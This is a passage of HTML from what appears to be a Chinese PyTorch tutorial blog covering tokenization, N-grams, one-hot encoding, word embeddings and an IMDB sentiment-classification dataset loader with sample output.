class="token operator">/=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nTest set: Avg. loss: {:.4f}, Accuracy: {}/{} ({:.2f}%)\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        test_loss<span class="token punctuation">,</span> correct<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token number">100</span><span class="token punctuation">.</span> <span class="token operator">*</span> correct <span class="token operator">/</span> <span class="token builtin">len</span><span class="token punctuation">(</span>test_dataloader<span class="token punctuation">.</span>dataset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    test<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#模型训练5轮</span>        train<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        test<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><p>​</p><h2 id="1-3-循环神经网络">1.3 循环神经网络</h2><h3 id="2-1-RNN和NLP介绍">2.1 RNN和NLP介绍</h3><h4 id="2-1-1-文本的tokenization">2.1.1 文本的tokenization</h4><p><code>tokenization</code>就是通常所说的分词，分出的每一个词语我们把它称为<code>token</code></p><p>常见的分词工具很多，比如：</p><ul><li><a href="https://github.com/fxsjy/jieba">jieba分词</a></li><li>清华分词工具<a href="https://github.com/thunlp/THULAC-Python">THULAC</a></li></ul><p>​</p><p>​</p><h4 id="2-1-2-N-garm">2.1.2  N-garm</h4><p>准备词语特征的方法。有时我们可以用2个、3个或者多个词来表示。<code>N-gram</code>其中的<code>N</code>表示能够被一起使用的词的数量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">:</span> text <span class="token operator">=</span> <span class="token string">"深度学习（英语：deep learning）是机器学习的分支，是一种以人工神经网络为架构，对数据进行表征学习的算法。"</span>In <span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">:</span> cuted <span class="token operator">=</span> jieba<span class="token punctuation">.</span>lcut<span class="token punctuation">(</span>text<span class="token punctuation">)</span>In <span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>cuted<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cuted<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#N-gram 中n=2时</span>Out<span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'深度'</span><span class="token punctuation">,</span> <span class="token string">'学习'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'学习'</span><span class="token punctuation">,</span> <span class="token string">'（'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'（'</span><span class="token punctuation">,</span> <span class="token string">'英语'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'英语'</span><span class="token punctuation">,</span> <span class="token string">'：'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'：'</span><span class="token punctuation">,</span> <span class="token string">'deep'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'deep'</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'learning'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'learning'</span><span class="token punctuation">,</span> <span class="token string">'）'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'）'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'机器'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'机器'</span><span class="token punctuation">,</span> <span class="token string">'学习'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'学习'</span><span class="token punctuation">,</span> <span class="token string">'的'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'的'</span><span class="token punctuation">,</span> <span class="token string">'分支'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'分支'</span><span class="token punctuation">,</span> <span class="token string">'，'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'，'</span><span class="token punctuation">,</span> <span class="token string">'是'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'是'</span><span class="token punctuation">,</span> <span class="token string">'一种'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'一种'</span><span class="token punctuation">,</span> <span class="token string">'以'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'以'</span><span class="token punctuation">,</span> <span class="token string">'人工神经网络'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'人工神经网络'</span><span class="token punctuation">,</span> <span class="token string">'为'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'为'</span><span class="token punctuation">,</span> <span class="token string">'架构'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'架构'</span><span class="token punctuation">,</span> <span class="token string">'，'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'，'</span><span class="token punctuation">,</span> <span class="token string">'对'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'对'</span><span class="token punctuation">,</span> <span class="token string">'数据'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'数据'</span><span class="token punctuation">,</span> <span class="token string">'进行'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'进行'</span><span class="token punctuation">,</span> <span class="token string">'表征'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'表征'</span><span class="token punctuation">,</span> <span class="token string">'学习'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'学习'</span><span class="token punctuation">,</span> <span class="token string">'的'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'的'</span><span class="token punctuation">,</span> <span class="token string">'算法'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'算法'</span><span class="token punctuation">,</span> <span class="token string">'。'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在传统的机器学习中，使用N-gram方法往往能够取得非常好的效果，但是在深度学习比如RNN中会自带N-gram的效果。</p><p>​</p><p>​</p><h4 id="2-1-3-向量化">2.1.3 向量化</h4><p>文本不能够直接被模型计算，所以需要将其转化为向量</p><p>把文本转化为向量有两种方法：</p><ol><li>转化为one-hot编码</li><li>转化为word embedding</li></ol><p>​</p><p>​</p><h5 id="one-hot-编码">one-hot 编码</h5><p>在one-hot编码中，每一个token使用一个长度为N的向量表示，N表示词典的数量</p><p>即：把待处理的文档进行分词或者是N-gram处理，然后进行去重得到词典，假设我们有一个文档：<code>深度学习</code>，那么进行one-hot处理后的结果：</p><table><thead><tr><th>token</th><th>one-hot encoding</th></tr></thead><tbody><tr><td>深</td><td>1000</td></tr><tr><td>度</td><td>0100</td></tr><tr><td>学</td><td>0010</td></tr><tr><td>习</td><td>0001</td></tr></tbody></table><p>​</p><p>​</p><h5 id="word-embedding">word embedding</h5><p>word embedding使用了<strong>浮点型的稠密矩阵</strong>来表示token。根据词典的大小，我们的向量通常使用不同的维度，例如100,256,300等。其中向量中的每一个值是一个参数，其初始值是随机生成的，之后会在训练的过程中进行学习而获得。</p><p>如果我们文本中有20000个词语，如果使用one-hot编码，那么我们会有20000*20000的矩阵，其中大多数的位置都为0，但是如果我们使用word embedding来表示的话，只需要20000* 维度，比如20000*300</p><p>形象的表示就是：</p><table><thead><tr><th>token</th><th>num</th><th>vector</th></tr></thead><tbody><tr><td>词1</td><td>0</td><td><code>[w11,w12,w13...w1N]</code> ,其中N表示维度（dimension）</td></tr><tr><td>词2</td><td>1</td><td><code>[w21,w22,w23...w2N] </code></td></tr><tr><td>词3</td><td>2</td><td><code>[w31,w23,w33...w3N] </code></td></tr><tr><td>…</td><td>….</td><td>…</td></tr><tr><td>词m</td><td>m</td><td><code>[wm1,wm2,wm3...wmN]</code>,其中m表示词典的大小</td></tr></tbody></table><p>我们会把所有的文本转化为向量，把句子用向量来表示</p><p>但是在这中间，<strong>我们会先把token使用数字来表示，再把数字使用向量来表示。</strong></p><p>即：<code>token---&gt; num ----&gt;vector</code></p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5Cword_embedding.png" alt=""></p><p><strong>word embedding API</strong></p><p><code>torch.nn.Embedding(num_embeddings,embedding_dim)</code></p><p>参数介绍：</p><ol><li><code>num_embeddings</code>：词典的大小</li><li><code>embedding_dim</code>：embedding的维度</li></ol><p>使用方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">embedding <span class="token operator">=</span> nn<span class="token punctuation">.</span>Embedding<span class="token punctuation">(</span>vocab_size<span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">)</span> <span class="token comment">#实例化</span>input_embeded <span class="token operator">=</span> embedding<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">)</span>         <span class="token comment">#进行embedding的操作</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>​</p><p>​</p><h5 id="数据的形状变化">数据的形状变化</h5><p>思考：每个batch中的每个句子有10个词语，经过形状为[20，4]的Word emebedding之后，原来的句子会变成什么形状？</p><p>每个词语用长度为4的向量表示，所以，最终句子会变为<code>[batch_size,10,4]</code>的形状。</p><p>增加了一个维度，这个维度是embedding的dim</p><p>​</p><p>​</p><h3 id="2-2-文本情感分类">2.2 文本情感分类</h3><h4 id="1-案例介绍">1. 案例介绍</h4><p>为了对前面的word embedding这种常用的文本向量化的方法进行巩固，这里我们会完成一个文本情感分类的案例</p><p>现在我们有一个经典的数据集<code>IMDB</code>数据集，地址：<code>http://ai.stanford.edu/~amaas/data/sentiment/</code>，这是一份包含了5万条流行电影的评论数据，其中训练集25000条，测试集25000条。数据格式如下：</p><p>下图左边为名称，其中名称包含两部分，分别是序号和情感评分，（1-4为neg，5-10为pos），右边为评论内容</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E6%A0%B7%E6%9C%AC%E5%90%8D%E7%A7%B0.png" alt=""></p><p>根据上述的样本，需要使用pytorch完成模型，实现对评论情感进行预测</p><h4 id="2-思路分析">2. 思路分析</h4><p>首先可以把上述问题定义为分类问题，情感评分分为1-10，10个类别（也可以理解为回归问题，这里当做分类问题考虑）。那么根据之前的经验，我们的大致流程如下：</p><ol><li>准备数据集</li><li>构建模型</li><li>模型训练</li><li>模型评估</li></ol><p>知道思路之后，那么我们一步步来完成上述步骤</p><h4 id="3-准备数据集">3. 准备数据集</h4><p>准备数据集和之前的方法一样，实例化dataset，准备dataloader，最终我们的数据可以处理成如下格式：</p><p><img src="D:%5CGit-repo%5Chexo%5Csource_posts%5Cdeeplearning-basic%5C%E6%83%85%E6%84%9F%E5%88%86%E7%B1%BB-data%E5%8A%A0%E8%BD%BD1.png" alt=""></p><p>其中有两点需要注意：</p><ol><li>如何完成基础打Dataset的构建和Dataloader的准备</li><li>每个batch中文本的长度不一致的问题如何解决</li><li>每个batch中的文本如何转化为数字序列</li></ol><h5 id="3-1-基础Dataset的准备">3.1 基础Dataset的准备</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">from</span> torch<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>data <span class="token keyword">import</span> DataLoader<span class="token punctuation">,</span>Dataset<span class="token keyword">import</span> os<span class="token keyword">import</span> redata_base_path <span class="token operator">=</span> <span class="token string">r"data\aclImdb"</span><span class="token comment">#1. 定义tokenize的方法</span><span class="token keyword">def</span> <span class="token function">tokenize</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># fileters = '!"#$%&amp;()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~\t\n'</span>    fileters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'!'</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'$'</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">,</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span><span class="token string">'\('</span><span class="token punctuation">,</span><span class="token string">'\)'</span><span class="token punctuation">,</span><span class="token string">'\*'</span><span class="token punctuation">,</span><span class="token string">'\+'</span><span class="token punctuation">,</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token string">'-'</span><span class="token punctuation">,</span><span class="token string">'\.'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">';'</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token string">'&gt;'</span><span class="token punctuation">,</span><span class="token string">'\?'</span><span class="token punctuation">,</span><span class="token string">'@'</span>        <span class="token punctuation">,</span><span class="token string">'\['</span><span class="token punctuation">,</span><span class="token string">'\\'</span><span class="token punctuation">,</span><span class="token string">'\]'</span><span class="token punctuation">,</span><span class="token string">'^'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'`'</span><span class="token punctuation">,</span><span class="token string">'\{'</span><span class="token punctuation">,</span><span class="token string">'\|'</span><span class="token punctuation">,</span><span class="token string">'\}'</span><span class="token punctuation">,</span><span class="token string">'~'</span><span class="token punctuation">,</span><span class="token string">'\t'</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\x97'</span><span class="token punctuation">,</span><span class="token string">'\x96'</span><span class="token punctuation">,</span><span class="token string">'”'</span><span class="token punctuation">,</span><span class="token string">'“'</span><span class="token punctuation">,</span><span class="token punctuation">]</span>    text <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"&lt;.*?&gt;"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    text <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>fileters<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span>text<span class="token punctuation">,</span>flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>i<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token comment">#2. 准备dataset</span><span class="token keyword">class</span> <span class="token class-name">ImdbDataset</span><span class="token punctuation">(</span>Dataset<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>mode<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token builtin">super</span><span class="token punctuation">(</span>ImdbDataset<span class="token punctuation">,</span>self<span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> mode<span class="token operator">==</span><span class="token string">"train"</span><span class="token punctuation">:</span>            text_path <span class="token operator">=</span> <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_base_path<span class="token punctuation">,</span>i<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"train/neg"</span><span class="token punctuation">,</span><span class="token string">"train/pos"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            text_path <span class="token operator">=</span>  <span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_base_path<span class="token punctuation">,</span>i<span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"test/neg"</span><span class="token punctuation">,</span><span class="token string">"test/pos"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>        self<span class="token punctuation">.</span>total_file_path_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> text_path<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>total_file_path_list<span class="token punctuation">.</span>extend<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span> <span class="token keyword">for</span> j <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">__getitem__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>        cur_path <span class="token operator">=</span> self<span class="token punctuation">.</span>total_file_path_list<span class="token punctuation">[</span>idx<span class="token punctuation">]</span>        cur_filename <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>        label <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>cur_filename<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">#处理标题，获取label，转化为从[0-9]</span>        text <span class="token operator">=</span> tokenize<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#直接按照空格进行分词</span>        <span class="token keyword">return</span> label<span class="token punctuation">,</span>text    <span class="token keyword">def</span> <span class="token function">__len__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>total_file_path_list<span class="token punctuation">)</span>     <span class="token comment"># 2. 实例化，准备dataloader</span>dataset <span class="token operator">=</span> ImdbDataset<span class="token punctuation">(</span>mode<span class="token operator">=</span><span class="token string">"train"</span><span class="token punctuation">)</span>dataloader <span class="token operator">=</span> DataLoader<span class="token punctuation">(</span>dataset<span class="token operator">=</span>dataset<span class="token punctuation">,</span>batch_size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>shuffle<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#3. 观察数据输出结果</span><span class="token keyword">for</span> idx<span class="token punctuation">,</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span>text<span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>dataloader<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"idx："</span><span class="token punctuation">,</span>idx<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"table:"</span><span class="token punctuation">,</span>label<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"text:"</span><span class="token punctuation">,</span>text<span class="token punctuation">)</span>    <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">idx： <span class="token number">0</span>table<span class="token punctuation">:</span> tensor<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>text<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'Want'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'thought'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token string">'great'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'was'</span><span class="token punctuation">,</span> <span class="token string">'recipe'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'great'</span><span class="token punctuation">,</span> <span class="token string">'failure'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'idea'</span><span class="token punctuation">,</span> <span class="token string">'Take'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'but'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'boy'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'was'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'it'</span><span class="token punctuation">,</span> <span class="token string">'plot'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'poorly'</span><span class="token punctuation">,</span> <span class="token string">'add'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'executed'</span><span class="token punctuation">,</span> <span class="token string">'in'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'We'</span><span class="token punctuation">,</span> <span class="token string">'some'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'do'</span><span class="token punctuation">,</span> <span class="token string">'weak'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'completely'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'undeveloped'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'broad'</span><span class="token punctuation">,</span> <span class="token string">'characters'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'sense'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'of'</span><span class="token punctuation">,</span> <span class="token string">'than'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'how'</span><span class="token punctuation">,</span> <span class="token string">'throw'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'complex'</span><span class="token punctuation">,</span> <span class="token string">'in'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'the'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'challenging'</span><span class="token punctuation">,</span> <span class="token string">'worst'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'the'</span><span class="token punctuation">,</span> <span class="token string">'special'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'backstage'</span><span class="token punctuation">,</span> <span class="token string">'effects'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'operations'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'of'</span><span class="token punctuation">,</span> <span class="token string">'horror'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'movie'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">,</span> <span class="token string">'has'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'are'</span><span class="token punctuation">,</span> <span class="token string">'known'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'but'</span><span class="token punctuation">,</span> <span class="token string">'Let'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'virtually'</span><span class="token punctuation">,</span> <span class="token string">'stew'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">,</span> <span class="token string">'for'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'show'</span><span class="token punctuation">,</span> <span class="token string">'somehow'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'rather'</span><span class="token punctuation">,</span> <span class="token string">'destroy'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'than'</span><span class="token 